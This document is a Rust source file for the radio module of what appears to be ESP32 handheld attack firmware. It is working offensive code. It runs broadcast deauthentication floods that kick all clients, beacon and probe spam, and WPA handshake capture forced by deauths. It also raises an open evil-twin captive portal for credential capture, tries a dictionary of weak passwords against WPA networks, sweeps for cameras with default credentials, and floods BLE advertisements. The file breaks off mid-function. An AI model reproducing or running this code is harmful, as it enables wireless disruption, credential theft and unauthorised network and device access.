//! Radio orchestration — the single owner of the WiFi + BLE peripherals.
//!
//! `main` used to carry ~250 lines of free-function radio plumbing plus five
//! `Option<...>` handles threaded through every call. That is all consolidated
//! here into one `Radio` value with a high-level, UI-agnostic API:
//!
//!   * recon  — [`Radio::scan`], [`Radio::detect`], [`Radio::ble_scan`]
//!   * attack — [`Radio::deauth`], [`Radio::beacon_spam`], [`Radio::probe_flood`],
//!              [`Radio::ble_spam`]
//!
//! Results come back as owned data (so this module never touches the display).
//! The long-running attacks take a `tick(count) -> bool` closure: it is called
//! between bursts so the caller can repaint a counter and poll for an abort key;
//! returning `false` stops the attack. That keeps the radio free of any UI/​input
//! dependency while still being interruptible.
//!
//! Raw 802.11 injection rides on `Sniffer::send_raw_frame` (`esp_wifi_80211_tx`),
//! confirmed present in esp-radio 0.18. BLE advertising is driven straight over
//! the `BleConnector`'s HCI transport, same as the passive scanner.
//!
//! Submodules: raw frame builders + the attack/portal/scan payload logic. They
//! are re-exported flat at the crate root (see main.rs).

pub mod ble_spam;
pub mod camscan;
pub mod digest;
pub mod http;
pub mod netscan;
pub mod portal;
pub mod webui;
pub mod wifi_frames;

use alloc::{string::String, vec::Vec};

use esp_hal::{
    delay::Delay,
    time::{Duration, Instant},
};

// `ble_spam` / `wifi_frames` are sibling submodules of this `radio` module
// (declared above), so they're already in scope — no `use` needed.

// ----------------------------- result types -----------------------------

/// One access point from a scan. Carries the BSSID + channel so an attack tool
/// can target it directly.
pub struct ScannedAp {
    pub ssid: String,
    pub bssid: [u8; 6],
    pub rssi: i8,
    pub channel: u8,
    pub auth: &'static str,
}

/// One BLE device from a scan (deduped by address).
pub struct ScannedBle {
    pub addr: [u8; 6],
    pub rssi: i8,
    pub name: Option<String>,
}

/// Management-frame tallies from the deauth detector.
#[derive(Clone, Copy, Default)]
pub struct DetResult {
    pub deauth: u32,
    pub disassoc: u32,
    pub beacon: u32,
    pub frames: u32,
}

// ------------------------- detector RX callback --------------------------
// The promiscuous RX callback is a bare `fn` (no captures), so it can only reach
// statics. These are reset at the start of every detector run.

use core::sync::atomic::{AtomicBool, AtomicU32, Ordering};

static DET_DEAUTH: AtomicU32 = AtomicU32::new(0);
static DET_DISASSOC: AtomicU32 = AtomicU32::new(0);
static DET_BEACON: AtomicU32 = AtomicU32::new(0);
static DET_FRAMES: AtomicU32 = AtomicU32::new(0);

fn detector_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
    DET_FRAMES.fetch_add(1, Ordering::Relaxed);
    let data = pkt.data;
    if !data.is_empty() {
        let fc = data[0]; // 802.11 frame-control byte
        if fc & 0x0C == 0x00 {
            // management frame; subtype is the top nibble
            match fc & 0xF0 {
                0xC0 => DET_DEAUTH.fetch_add(1, Ordering::Relaxed),
                0xA0 => DET_DISASSOC.fetch_add(1, Ordering::Relaxed),
                0x80 => DET_BEACON.fetch_add(1, Ordering::Relaxed),
                _ => 0,
            };
        }
    }
}

/// EAPOL frames seen during a handshake capture (separate cb so the detector's
/// counters stay independent).
static EAPOL_COUNT: AtomicU32 = AtomicU32::new(0);

fn handshake_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
    let d = pkt.data;
    // 802.11 data frame (fc type bits = 0b10) carrying an EAPOL ethertype. After
    // the MAC header sits an LLC/SNAP shim `AA AA 03 00 00 00` then ethertype
    // `88 8E` (EAPOL). Scan a short window so we tolerate QoS / addr4 variations.
    if d.len() > 34 && (d[0] & 0x0C) == 0x08 {
        let end = d.len().saturating_sub(8).min(40);
        let mut i = 24;
        while i < end {
            if d[i] == 0xAA && d[i + 1] == 0xAA && d[i + 2] == 0x03 && d[i + 6] == 0x88 && d[i + 7] == 0x8E {
                EAPOL_COUNT.fetch_add(1, Ordering::Relaxed);
                break;
            }
            i += 1;
        }
    }
}

// ---------------------- global STA link state ----------------------
// One persistent association can outlive any single app, so the topbar reads
// this each frame to show a connectivity indicator. Plain atomic (no lock):
// writes happen only on the main loop's radio ops, reads in the per-frame draw.
static WIFI_LINK: AtomicBool = AtomicBool::new(false);

/// True once associated AND a DHCP lease was obtained. NOT a guarantee of real
/// internet reachability — just link-up with an IP (the honest cheap signal).
pub fn wifi_connected() -> bool {
    WIFI_LINK.load(Ordering::Relaxed)
}

/// Clear the link state. Funnelled through `deinit_wifi` so EVERY WiFi teardown
/// path (disconnect, Player/emulator `shutdown`, a BLE op stealing the radio,
/// a failed associate) clears the indicator — it can never go stale.
fn clear_link() {
    WIFI_LINK.store(false, Ordering::Relaxed);
}

/// A future that resolves once `dur` has elapsed since `start`. It busy-wakes, so
/// under the preemptive scheduler the other half of a `select` (a radio read)
/// keeps getting polled while higher-priority radio tasks run — a timeout without
/// embassy-time.
struct Deadline {
    start: Instant,
    dur: Duration,
}
impl core::future::Future for Deadline {
    type Output = ();
    fn poll(self: core::pin::Pin<&mut Self>, cx: &mut core::task::Context<'_>) -> core::task::Poll<()> {
        if self.start.elapsed() >= self.dur {
            core::task::Poll::Ready(())
        } else {
            cx.waker().wake_by_ref();
            core::task::Poll::Pending
        }
    }
}

/// Human-readable security label for an AP's auth method.
pub fn auth_label(m: Option<esp_radio::wifi::AuthenticationMethod>) -> &'static str {
    use esp_radio::wifi::AuthenticationMethod as A;
    match m {
        None | Some(A::None) => "open",
        Some(A::Wep) => "WEP",
        Some(A::Wpa) => "WPA",
        Some(A::Wpa2Personal) => "WPA2",
        Some(A::WpaWpa2Personal) => "WPA/2",
        Some(A::Wpa2Enterprise) => "WPA2-E",
        Some(A::Wpa3Personal) => "WPA3",
        Some(A::Wpa2Wpa3Personal) => "WPA2/3",
        Some(A::Owe) => "OWE",
        _ => "sec",
    }
}

/// Extract a BLE device name (complete/shortened local name) from advertising data.
fn parse_ble_name(data: &[u8]) -> Option<&str> {
    let mut i = 0;
    while i < data.len() {
        let len = data[i] as usize;
        if len == 0 || i + 1 + len > data.len() {
            break;
        }
        let ad_type = data[i + 1];
        if ad_type == 0x09 || ad_type == 0x08 {
            return core::str::from_utf8(&data[i + 2..i + 1 + len]).ok();
        }
        i += 1 + len;
    }
    None
}

// ------------------------------ the radio --------------------------------

pub struct Radio {
    wifi_periph: Option<esp_hal::peripherals::WIFI<'static>>,
    wifi_ctrl: Option<esp_radio::wifi::WifiController<'static>>,
    wifi_ifaces: Option<esp_radio::wifi::Interfaces<'static>>,
    ble_periph: Option<esp_hal::peripherals::BT<'static>>,
    ble_conn: Option<esp_radio::ble::controller::BleConnector<'static>>,
}

impl Radio {
    pub fn new(
        wifi: esp_hal::peripherals::WIFI<'static>,
        bt: esp_hal::peripherals::BT<'static>,
    ) -> Self {
        Self {
            wifi_periph: Some(wifi),
            wifi_ctrl: None,
            wifi_ifaces: None,
            ble_periph: Some(bt),
            ble_conn: None,
        }
    }

    /// Bring up the WiFi controller (Station mode, started). Idempotent. Frees BLE
    /// first — the radios are mutually exclusive (see the heap note in main.rs).
    fn ensure_wifi(&mut self) -> bool {
        use esp_radio::wifi::sta::StationConfig;
        use esp_radio::wifi::{self, Config};
        if self.wifi_ctrl.is_some() {
            return true;
        }
        self.deinit_ble();
        // First use takes the real peripheral; after a deinit we re-`steal()` it
        // (the HW is a global singleton, so re-acquiring it is sound here).
        let w = self
            .wifi_periph
            .take()
            .unwrap_or_else(|| unsafe { esp_hal::peripherals::WIFI::steal() });
        let (mut c, ifs) = match wifi::new(w, Default::default()) {
            Ok(x) => x,
            Err(_) => return false,
        };
        // set_config(Station) internally calls esp_wifi_start().
        if c.set_config(&Config::Station(StationConfig::default())).is_err() {
            return false;
        }
        self.wifi_ctrl = Some(c);
        self.wifi_ifaces = Some(ifs);
        true
    }

    /// Bring up the BLE connector (raw HCI transport). Idempotent. Frees WiFi first.
    fn ensure_ble(&mut self) -> bool {
        if self.ble_conn.is_some() {
            return true;
        }
        self.deinit_wifi();
        let bt = self
            .ble_periph
            .take()
            .unwrap_or_else(|| unsafe { esp_hal::peripherals::BT::steal() });
        match esp_radio::ble::controller::BleConnector::new(bt, Default::default()) {
            Ok(c) => {
                self.ble_conn = Some(c);
                true
            }
            Err(_) => false,
        }
    }

    /// Tear down WiFi, freeing its heap (WifiController::drop -> wifi_deinit).
    fn deinit_wifi(&mut self) {
        self.wifi_ifaces = None;
        self.wifi_ctrl = None;
        clear_link(); // the single chokepoint that keeps the topbar indicator honest
    }

    /// Tear down BLE, freeing its heap (BleConnector::drop -> ble_deinit).
    fn deinit_ble(&mut self) {
        self.ble_conn = None;
    }

    /// Free ALL radio heap (WiFi + BLE). Call before launching a heap-hungry app —
    /// the audio Player and Game Boy emulator each need most of the heap that the
    /// radio otherwise holds for the session, and they never run alongside it. The
    /// radio re-initialises lazily on its next use (ensure_wifi/ensure_ble re-`steal`
    /// the peripheral after a deinit), so this is safe to call any time.
    pub fn shutdown(&mut self) {
        self.deinit_wifi();
        self.deinit_ble();
    }

    fn set_channel(&mut self, ch: u8) {
        use esp_radio::wifi::SecondaryChannel;
        if let Some(c) = self.wifi_ctrl.as_mut() {
            let _ = c.set_channel(ch, SecondaryChannel::None);
        }
    }

    // ------------------------------ recon ------------------------------

    /// Blocking WiFi scan -> APs sorted by signal strength. `None` on radio error.
    pub fn scan(&mut self) -> Option<Vec<ScannedAp>> {
        use esp_radio::wifi::scan::ScanConfig;
        self.scan_cfg(ScanConfig::default().with_max(64))
    }

    /// Fast single-channel scan for live radar target-tracking (~150 ms vs the
    /// ~0.5 s full sweep). Only APs on `ch` come back.
    pub fn scan_channel(&mut self, ch: u8) -> Option<Vec<ScannedAp>> {
        use esp_radio::wifi::scan::ScanConfig;
        self.scan_cfg(ScanConfig::default().with_channel(ch).with_max(32))
    }

    fn scan_cfg(&mut self, cfg: esp_radio::wifi::scan::ScanConfig) -> Option<Vec<ScannedAp>> {
        if !self.ensure_wifi() {
            return None;
        }
        // make sure a prior detector run didn't leave promiscuous mode on
        if let Some(i) = self.wifi_ifaces.as_mut() {
            let _ = i.sniffer.set_promiscuous_mode(false);
        }
        let c = self.wifi_ctrl.as_mut()?;
        match embassy_futures::block_on(c.scan_async(&cfg)) {
            Ok(mut aps) => {
                aps.sort_by(|a, b| b.signal_strength.cmp(&a.signal_strength));
                let mut out = Vec::with_capacity(aps.len());
                for ap in aps.iter() {
                    out.push(ScannedAp {
                        ssid: String::from(ap.ssid.as_str()),
                        bssid: ap.bssid,
                        rssi: ap.signal_strength,
                        channel: ap.channel,
                        auth: auth_label(ap.auth_method),
                    });
                }
                Some(out)
            }
            Err(_) => None,
        }
    }

    /// Promiscuous capture across channels 1..=13 (~3 s), tallying deauth/disassoc/
    /// beacon management frames. `None` on radio error.
    pub fn detect(&mut self) -> Option<DetResult> {
        use esp_radio::wifi::SecondaryChannel;
        if !self.ensure_wifi() {
            return None;
        }
        DET_DEAUTH.store(0, Ordering::Relaxed);
        DET_DISASSOC.store(0, Ordering::Relaxed);
        DET_BEACON.store(0, Ordering::Relaxed);
        DET_FRAMES.store(0, Ordering::Relaxed);
        {
            let i = self.wifi_ifaces.as_mut()?;
            i.sniffer.set_receive_cb(detector_cb);
            if i.sniffer.set_promiscuous_mode(true).is_err() {
                return None;
            }
        }
        let d = Delay::new();
        for ch in 1..=13u8 {
            if let Some(c) = self.wifi_ctrl.as_mut() {
                let _ = c.set_channel(ch, SecondaryChannel::None);
            }
            d.delay_millis(250);
        }
        if let Some(i) = self.wifi_ifaces.as_mut() {
            let _ = i.sniffer.set_promiscuous_mode(false);
        }
        Some(DetResult {
            deauth: DET_DEAUTH.load(Ordering::Relaxed),
            disassoc: DET_DISASSOC.load(Ordering::Relaxed),
            beacon: DET_BEACON.load(Ordering::Relaxed),
            frames: DET_FRAMES.load(Ordering::Relaxed),
        })
    }

    // ------------------------- WiFi injection --------------------------

    /// Arm raw TX: ensure WiFi up, park on `channel`, enter promiscuous mode
    /// (needed so `esp_wifi_80211_tx` isn't gated on being associated).
    fn arm_tx(&mut self, channel: u8) -> bool {
        if !self.ensure_wifi() {
            return false;
        }
        self.set_channel(channel);
        match self.wifi_ifaces.as_mut() {
            Some(i) => i.sniffer.set_promiscuous_mode(true).is_ok(),
            None => false,
        }
    }

    fn disarm_tx(&mut self) {
        if let Some(i) = self.wifi_ifaces.as_mut() {
            let _ = i.sniffer.set_promiscuous_mode(false);
        }
    }

    /// Broadcast deauth + disassoc flood against the BSS `bssid` on `channel`.
    /// Kicks every associated client (DA = broadcast). Runs until `tick` returns
    /// false. Returns frames sent, or `None` on radio error.
    pub fn deauth(&mut self, bssid: [u8; 6], channel: u8, mut tick: impl FnMut(u32) -> bool) -> Option<u32> {
        if !self.arm_tx(channel) {
            return None;
        }
        let ifs = self.wifi_ifaces.as_mut()?;
        let delay = Delay::new();
        let mut buf = [0u8; wifi_frames::DEAUTH_LEN];
        let mut sent = 0u32;
        loop {
            for _ in 0..12 {
                let n = wifi_frames::deauth(&mut buf, wifi_frames::BROADCAST, bssid, 7);
                let _ = ifs.sniffer.send_raw_frame(true, &buf[..n], false);
                let n2 = wifi_frames::disassoc(&mut buf, wifi_frames::BROADCAST, bssid, 7);
                let _ = ifs.sniffer.send_raw_frame(true, &buf[..n2], false);
                sent += 2;
                delay.delay_millis(2);
            }
            if !tick(sent) {
                break;
            }
        }
        self.disarm_tx();
        Some(sent)
    }

    /// Beacon-spam a list of fake SSIDs on `channel` (one random BSSID per beacon).
    /// Runs until `tick` returns false. Returns beacons sent, or `None` on error.
    pub fn beacon_spam(&mut self, ssids: &[&str], channel: u8, mut tick: impl FnMut(u32) -> bool) -> Option<u32> {
        if !self.arm_tx(channel) {
            return None;
        }
        let ifs = self.wifi_ifaces.as_mut()?;
        let delay = Delay::new();
        let mut buf = [0u8; wifi_frames::max_beacon_len(32)];
        let mut sent = 0u32;
        let mut seq = 0u32;
        loop {
            for s in ssids {
                let mac = wifi_frames::fake_mac(seq);
                let bytes = s.as_bytes();
                let ssid = &bytes[..bytes.len().min(32)];
                let n = wifi_frames::beacon(&mut buf, mac, ssid, channel, false);
                let _ = ifs.sniffer.send_raw_frame(true, &buf[..n], false);
                sent += 1;
                seq = seq.wrapping_add(1);
                delay.delay_millis(3);
            }
            if !tick(sent) {
                break;
            }
        }
        self.disarm_tx();
        Some(sent)
    }

    /// Flood probe requests for a list of SSIDs (coaxes hidden APs + spams the
    /// air with fake clients). Runs until `tick` returns false.
    pub fn probe_flood(&mut self, ssids: &[&str], channel: u8, mut tick: impl FnMut(u32) -> bool) -> Option<u32> {
        if !self.arm_tx(channel) {
            return None;
        }
        let ifs = self.wifi_ifaces.as_mut()?;
        let delay = Delay::new();
        let mut buf = [0u8; wifi_frames::max_probe_len(32)];
        let mut sent = 0u32;
        let mut seq = 0u32;
        loop {
            for s in ssids {
                let src = wifi_frames::fake_mac(seq.wrapping_mul(7));
                let bytes = s.as_bytes();
                let ssid = &bytes[..bytes.len().min(32)];
                let n = wifi_frames::probe_req(&mut buf, src, ssid);
                let _ = ifs.sniffer.send_raw_frame(true, &buf[..n], false);
                sent += 1;
                seq = seq.wrapping_add(1);
                delay.delay_millis(3);
            }
            if !tick(sent) {
                break;
            }
        }
        self.disarm_tx();
        Some(sent)
    }

    /// Handshake capture: briefly deauth `bssid` (to force clients to reconnect)
    /// while sniffing its channel for EAPOL (the WPA 4-way handshake — the thing
    /// you'd crack offline). Counts EAPOL frames seen; `tick(count)` drives the UI
    /// and abort. Auto-stops after ~12 s. Returns the EAPOL count, `None` on error.
    pub fn handshake_capture(&mut self, bssid: [u8; 6], channel: u8, mut tick: impl FnMut(u32) -> bool) -> Option<u32> {
        if !self.ensure_wifi() {
            return None;
        }
        self.set_channel(channel);
        EAPOL_COUNT.store(0, Ordering::Relaxed);
        {
            let i = self.wifi_ifaces.as_mut()?;
            i.sniffer.set_receive_cb(handshake_cb);
            if i.sniffer.set_promiscuous_mode(true).is_err() {
                return None;
            }
        }
        let ifs = self.wifi_ifaces.as_mut()?;
        let delay = Delay::new();
        let mut buf = [0u8; wifi_frames::DEAUTH_LEN];
        let mut ticks = 0u32;
        loop {
            // a short deauth nudge each round keeps clients re-handshaking
            for _ in 0..4 {
                let n = wifi_frames::deauth(&mut buf, wifi_frames::BROADCAST, bssid, 7);
                let _ = ifs.sniffer.send_raw_frame(true, &buf[..n], false);
            }
            delay.delay_millis(200);
            ticks += 1;
            let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
            if !tick(eapol) || ticks >= 60 {
                break;
            }
        }
        self.disarm_tx();
        Some(EAPOL_COUNT.load(Ordering::Relaxed))
    }

    // ------------------------------ portal -----------------------------

    /// Bring up an OPEN SoftAP `ssid` on `channel` and run the captive portal
    /// (DHCP + DNS + HTTP credential capture) until `tick` returns false. Returns
    /// the capture stats, or `None` on radio error. The AP is torn down on exit.
    pub fn run_portal(
        &mut self,
        ssid: &str,
        channel: u8,
        tick: impl FnMut(&portal::Stats) -> bool,
    ) -> Option<portal::Stats> {
        use esp_radio::wifi::ap::AccessPointConfig;
        use esp_radio::wifi::{self, AuthenticationMethod, Config};
        // mutually exclusive radios: start from a clean slate.
        self.deinit_ble();
        self.deinit_wifi();
        let w = self
            .wifi_periph
            .take()
            .unwrap_or_else(|| unsafe { esp_hal::peripherals::WIFI::steal() });
        let (mut c, ifs) = match wifi::new(w, Default::default()) {
            Ok(x) => x,
            Err(_) => return None,
        };
        let ap_cfg = AccessPointConfig::default()
            .with_ssid(ssid)
            .with_channel(channel)
            .with_auth_method(AuthenticationMethod::None) // open AP, empty password
            .with_max_connections(4u16);
        if c.set_config(&Config::AccessPoint(ap_cfg)).is_err() {
            return None;
        }
        let ap_iface = ifs.access_point; // Interface is Copy
        let mac = ap_iface.mac_address();
        self.wifi_ctrl = Some(c);
        self.wifi_ifaces = Some(ifs);
        let stats = portal::run(ap_iface, mac, tick);
        // tear the AP down so the next tool starts from a clean radio.
        self.deinit_wifi();
        Some(stats)
    }

    // ------------------------------ netscan ----------------------------

    /// Join the OPEN network `ssid` as a station, then DHCP + port-scan the
    /// gateway. Returns the scan result, or `None` if association failed. The STA
    /// is torn down on exit. (Open networks only — no on-device password entry.)
    /// Common weak WiFi passwords tried by the WPA online dictionary ladder
    /// (attempt association with each). Educational: shows how weak defaults fall.
    const WIFI_PASSWORDS: &'static [&'static str] = &[
        "12345678", "123456789", "1234567890", "password", "11111111", "00000000",
        "123456789a", "987654321", "qwerty123", "1q2w3e4r", "11223344", "12341234",
        "admin1234", "internet", "wifi1234", "00112233", "88888888", "1234512345",
    ];

    /// Associate with `ssid`. Open APs join directly; encrypted ones run the
    /// common-password ladder (online dictionary). `prog(i, n)` reports crack
    /// progress and returns false to abort. On success the STA controller + iface
    /// are left in `self`; returns the cracked password ("" for open). On failure
    /// the link is torn down and a SPECIFIC reason string is returned.
    /// ONE association attempt on a FRESH controller. esp-radio's `set_config`
    /// PANICS (unknown error WIFI_STATE 0x3006) if reused on a dirty controller
    /// after a failed connect, so every attempt fully re-inits the WiFi → clean
    /// state. On success the controller + iface are left in `self`. Returns true
    /// if associated within `timeout_s`.
    fn assoc_once(&mut self, cfg: esp_radio::wifi::sta::StationConfig, timeout_s: u64) -> bool {
        use embassy_futures::select::{select, Either};
        use esp_radio::wifi::{self, Config};
        self.deinit_wifi();
        let w = self
            .wifi_periph
            .take()
            .unwrap_or_else(|| unsafe { esp_hal::peripherals::WIFI::steal() });
        let (mut c, ifs) = match wifi::new(w, Default::default()) {
            Ok(x) => x,
            Err(_) => return false,
        };
        let ok = c.set_config(&Config::Station(cfg)).is_ok()
            && matches!(
                embassy_futures::block_on(select(
                    c.connect_async(),
                    Deadline { start: Instant::now(), dur: Duration::from_secs(timeout_s) },
                )),
                Either::First(Ok(_))
            );
        self.wifi_ctrl = Some(c);
        self.wifi_ifaces = Some(ifs);
        ok
    }

    /// `known`: `Some(p)` joins with that password (empty `p` = open network);
    /// `None` runs the common-password crack ladder. Returns the cracked/used
    /// password ("" when the caller supplied it). `prog(i,n)` reports crack progress.
    fn associate(
        &mut self,
        ssid: &str,
        known: Option<&str>,
        mut prog: impl FnMut(usize, usize) -> bool,
    ) -> Result<&'static str, &'static str> {
        use esp_radio::wifi::sta::StationConfig;
        use esp_radio::wifi::AuthenticationMethod;
        self.deinit_ble();
        match known {
            // user-supplied password (or open) -> one attempt
            Some(p) => {
                let cfg = if p.is_empty() {
                    StationConfig::default().with_ssid(ssid).with_auth_method(AuthenticationMethod::None)
                } else {
                    StationConfig::default().with_ssid(ssid).with_password(p.into())
                };
                if self.assoc_once(cfg, 12) {
                    Ok("")
                } else {
                    self.deinit_wifi();
                    Err(if p.is_empty() { "assoc fail (open AP?)" } else { "assoc fail (wrong pass?)" })
                }
            }
            // attack: common-password ladder
            None => {
                let n = Self::WIFI_PASSWORDS.len();
                for (i, pass) in Self::WIFI_PASSWORDS.iter().enumerate() {
                    if !prog(i, n) {
                        self.deinit_wifi();
                        return Err("aborted");
                    }
                    esp_println::println!("[WPA] {}/{} try {:?}", i + 1, n, pass);
                    let cfg = StationConfig::default().with_ssid(ssid).with_password((*pass).into());
                    let ok = self.assoc_once(cfg, 5);
                    esp_println::println!("[WPA] {} -> {}", i + 1, ok);
                    if ok {
                        return Ok(*pass);
                    }
                }
                self.deinit_wifi();
                Err("wifi locked (weak-list dry)")
            }
        }
    }

    /// Join `ssid` (`known`: Some(pass)=join, empty=open, None=crack ladder), DHCP,
    /// then port-scan the gateway. `Err(reason)` carries a SPECIFIC failure string.
    pub fn run_netscan(
        &mut self,
        ssid: &str,
        known: Option<&str>,
        mut tick: impl FnMut(&netscan::NetResult) -> bool,
    ) -> Result<netscan::NetResult, &'static str> {
        let mut crack = netscan::NetResult::new();
        crack.phase = "wifi crack";
        let cracked = self.associate(ssid, known, |i, _n| {
            crack.scanned = i + 1;
            tick(&crack)
        })?;
        let sta = self.wifi_ifaces.as_ref().ok_or("no iface")?.station;
        let mac = sta.mac_address();
        let mut res = netscan::scan(sta, mac, tick);
        res.set_wifi_pass(cracked);
        self.deinit_wifi();
        Ok(res)
    }

    // ----------------------------- camera finder -----------------------------

    /// Join `ssid` (`known`: Some(pass)=join, empty=open, None=crack ladder), DHCP,
    /// then sweep the local `/24` for HTTP cameras/DVRs + try default creds. The STA
    /// is torn down on exit. `Err(reason)` carries a SPECIFIC failure string.
    pub fn run_camscan(
        &mut self,
        ssid: &str,
        known: Option<&str>,
        mut tick: impl FnMut(&camscan::CamResult) -> bool,
    ) -> Result<camscan::CamResult, &'static str> {
        let mut crack = camscan::CamResult::new();
        crack.phase = "wifi crack";
        let cracked = self.associate(ssid, known, |i, n| {
            crack.probed = i + 1;
            crack.total = n;
            tick(&crack)
        })?;
        let sta = self.wifi_ifaces.as_ref().ok_or("no iface")?.station;
        let mac = sta.mac_address();
        let mut res = camscan::sweep(sta, mac, tick);
        res.set_wifi_pass(cracked);
        self.deinit_wifi();
        Ok(res)
    }

    // ------------------------------ web ui -----------------------------

    /// Serve the Web UI dashboard on the EXISTING global STA connection. Unlike
    /// the old `run_webui`, it does NOT associate and does NOT tear the link down
    /// afterwards — the connection is shared/persistent (established once via
    /// [`Radio::connect_sta`]). Returns `None` if not currently connected.
    pub fn serve_webui<D, T>(
        &mut self,
        vm: &embedded_sdmmc::VolumeManager<D, T>,
        sys: &webui::SysSnapshot,
        tick: impl FnMut(&webui::ServeState) -> bool,
    ) -> Option<webui::ServeState>
    where
        D: embedded_sdmmc::BlockDevice,
        T: embedded_sdmmc::TimeSource,
    {
        if !wifi_connected() {
            return None;
        }
        let sta = self.wifi_ifaces.as_ref()?.station;
        let mac = sta.mac_address();
        Some(webui::serve(sta, mac, vm, sys, tick))
    }

    // -------------------- global internet connection -------------------

    /// Associate with `ssid` (open if `pw` is empty), pull a DHCP lease, and —
    /// unlike `run_webui` — LEAVE the STA up so the link persists across apps.
    /// Returns the leased IP, or `None` on failure/abort (link torn down then).
    /// `tick() -> false` aborts during the DHCP wait. Updates the global link
    /// state read by the topbar indicator.
    pub fn connect_sta(&mut self, ssid: &str, pw: &str, tick: impl FnMut() -> bool) -> Option<[u8; 4]> {
        use embassy_futures::select::{select, Either};
        use esp_radio::wifi::sta::StationConfig;
        use esp_radio::wifi::{AuthenticationMethod, Config};
        if !self.ensure_wifi() {
            return None;
        }
        let cfg = if pw.is_empty() {
            StationConfig::default().with_ssid(ssid).with_auth_method(AuthenticationMethod::None)
        } else {
            StationConfig::default().with_ssid(ssid).with_password(pw.into())
        };
        // set_config + associate (15 s cap), then drop the &mut wifi_ctrl borrow
        // before any deinit_wifi (which needs &mut self).
        let associated = {
            let c = self.wifi_ctrl.as_mut()?;
            if c.set_config(&Config::Station(cfg)).is_err() {
                false
            } else {
                matches!(
                    embassy_futures::block_on(select(
                        c.connect_async(),
                        Deadline { start: Instant::now(), dur: Duration::from_secs(15) },
                    )),
                    Either::First(Ok(_))
                )
            }
        };
        if !associated {
            self.deinit_wifi();
            return None;
        }
        let sta = self.wifi_ifaces.as_ref()?.station;
        let mac = sta.mac_address();
        match webui::dhcp_only(sta, mac, tick) {
            Some(ip) => {
                WIFI_LINK.store(true, Ordering::Relaxed);
                Some(ip)
            }
            None => {
                self.deinit_wifi();
                None
            }
        }
    }

    /// Drop the global STA association (and its heap). Clears the link indicator
    /// via the `deinit_wifi` chokepoint.
    pub fn disconnect_sta(&mut self) {
        self.deinit_wifi();
    }

    // ------------------------------- BLE -------------------------------

    /// Passive BLE scan via raw HCI for ~4 s. Returns devices deduped by address
    /// (strongest RSSI kept), or `None` on error.
    pub fn ble_scan(&mut self) -> Option<Vec<ScannedBle>> {
        use bt_hci::cmd::controller_baseband::Reset;
        use bt_hci::cmd::le::{LeSetScanEnable, LeSetScanParams};
        use bt_hci::event::le::LeEvent;
        use bt_hci::event::Event;
        use bt_hci::param::{AddrKind, Duration as HciDuration, LeScanKind, ScanningFilterPolicy};
        use bt_hci::transport::Transport;
        use bt_hci::ControllerToHostPacket;
        use embassy_futures::select::{select, Either};

        if !self.ensure_ble() {
            return None;
        }
        let c = self.ble_conn.as_ref()?;
        embassy_futures::block_on(async {
            let mut out: Vec<ScannedBle> = Vec::new();
            let mut buf = [0u8; 259];
            let drain = || Deadline { start: Instant::now(), dur: Duration::from_millis(400) };
            if Transport::write(c, &Reset::new()).await.is_err() {
                return None;
            }
            let _ = select(Transport::read(c, &mut buf), drain()).await;
            let params = LeSetScanParams::new(
                LeScanKind::Passive,
                HciDuration::<10_000>::from_millis(60),
                HciDuration::<10_000>::from_millis(60),
                AddrKind::PUBLIC,
                ScanningFilterPolicy::BasicUnfiltered,
            );
            let _ = Transport::write(c, &params).await;
            let _ = select(Transport::read(c, &mut buf), drain()).await;
            if Transport::write(c, &LeSetScanEnable::new(true, false)).await.is_err() {
                return None;
            }
            let start = Instant::now();
            loop {
                match select(
                    Transport::read(c, &mut buf),
                    Deadline { start, dur: Duration::from_secs(4) },
                )
                .await
                {
                    Either::First(Ok(ControllerToHostPacket::Event(ep))) => {
                        if let Ok(Event::Le(LeEvent::LeAdvertisingReport(report))) = Event::try_from(ep) {
                            for r in report.reports.iter().flatten() {
                                let addr = r.addr.into_inner();
                                if let Some(d) = out.iter_mut().find(|d| d.addr == addr) {
                                    if r.rssi > d.rssi {
                                        d.rssi = r.rssi;
                                    }
                                    if d.name.is_none() {
                                        if let Some(n) = parse_ble_name(r.data) {
                                            d.name = Some(String::from(n));
                                        }
                                    }
                                } else if out.len() < 64 {
                                    out.push(ScannedBle {
                                        addr,
                                        rssi: r.rssi,
                                        name: parse_ble_name(r.data).map(String::from),
                                    });
                                }
                            }
                        }
                    }
                    Either::First(_) => {}
                    Either::Second(_) => break,
                }
            }
            let _ = Transport::write(c, &LeSetScanEnable::new(false, false)).await;
            Some(out)
        })
    }

    /// BLE advertising spam: rotate a random MAC + a fresh `mode` payload as fast
    /// as the controller accepts it. Runs until `tick` returns false. Returns
    /// adverts pushed, or `None` on error.
    pub fn ble_spam(&mut self, mode: ble_spam::Mode, mut tick: impl FnMut(u32) -> bool) -> Option<u32> {
        use bt_hci::cmd::controller_baseband::Reset;
        use bt_hci::cmd::le::{LeSetAdvData, LeSetAdvEnable, LeSetAdvParams, LeSetRandomAddr};
        use bt_hci::param::{AddrKind, AdvChannelMap, AdvFilterPolicy, AdvKind, BdAddr, Duration as HciDuration};
        use bt_hci::transport::Transport;
        use embassy_futures::select::select;

        if !self.ensure_ble() {
            return None;
        }
        let c = self.ble_conn.as_ref()?;
        embassy_futures::block_on(async {
            let mut buf = [0u8; 259];
            let mut sent = 0u32;
            let mut seq = 0u32;
            let drain = || Deadline { start: Instant::now(), dur: Duration::from_millis(30) };
            if Transport::write(c, &Reset::new()).await.is_err() {
                return None;
            }
            let _ = select(Transport::read(c, &mut buf), drain()).await;
            loop {
                let mac = ble_spam::random_mac(seq);
                let (len, data) = ble_spam::payload(mode, seq);
                let _ = Transport::write(c, &LeSetAdvEnable::new(false)).await;
                let _ = Transport::write(c, &LeSetRandomAddr::new(BdAddr::new(mac))).await;
                let _ = Transport::write(
                    c,
                    &LeSetAdvParams::new(
                        HciDuration::<625>::from_millis(20),
                        HciDuration::<625>::from_millis(40),
                        AdvKind::AdvNonconnInd,
                        AddrKind::RANDOM,
                        AddrKind::PUBLIC,
                        BdAddr::new([0; 6]),
                        AdvChannelMap::ALL,
                        AdvFilterPolicy::Unfiltered,
                    ),
                )
                .await;
                let _ = Transport::write(c, &LeSetAdvData::new(len, data)).await;
                let _ = Transport::write(c, &LeSetAdvEnable::new(true)).await;
                // let it advertise briefly + soak up any controller events
                let _ = select(Transport::read(c, &mut buf), drain()).await;
                sent += 1;
                seq = seq.wrapping_add(1);
                if !tick(sent) {
                    break;
                }
            }
            let _ = Transport::write(c, &LeSetAdvEnable::new(false)).await;
            Some(sent)
